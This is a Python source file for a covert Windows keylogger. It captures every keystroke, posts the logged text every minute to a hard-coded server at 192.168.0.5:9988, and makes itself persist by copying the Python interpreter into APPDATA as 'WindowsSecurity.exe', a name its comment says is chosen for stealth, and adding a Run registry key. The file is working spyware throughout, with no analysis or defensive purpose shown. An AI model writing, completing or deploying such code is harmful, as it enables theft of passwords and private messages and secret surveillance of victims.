from pynput import keyboard
import requests
import threading
import os
import time
import winreg
import sys
import logging
import shutil

# --- Config ---
LOG_FILE = os.path.expanduser("~\\Documents\\keystrokes.txt")
SERVER_URL = "http://192.168.0.5:9988/submit"
UPLOAD_INTERVAL = 60  # seconds
EXE_NAME = "WindowsSecurity.exe"  # Fake legit name for stealth

# --- Logging for Debug ---
logging.basicConfig(filename=os.path.expanduser("~\\Documents\\keylogger_debug.log"), level=logging.INFO)


# --- Keylogger Function ---
def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    with open(LOG_FILE, "a") as f:
        f.write(key_str)


# --- Data Exfiltration to Server ---
def send_data():
    while True:
        time.sleep(UPLOAD_INTERVAL)
        if os.path.isfile(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                data = f.read()
            try:
                requests.post(SERVER_URL, data={"keystrokes": data})
                logging.info("Data sent successfully.")
                with open(LOG_FILE, "w"):
                    pass
            except Exception as e:
                logging.error(f"Failed to send data: {e}")


# --- Persistence via Registry ---
def persistence():
    exe_path = os.path.join(os.getenv('APPDATA'), EXE_NAME)
    if not os.path.exists(exe_path):
        try:
            shutil.copy(sys.executable, exe_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurity", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            logging.info("Persistence established.")
        except Exception as e:
            logging.error(f"Persistence failed: {e}")


# --- Main Runner ---
def main():
    persistence()
    threading.Thread(target=send_data, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
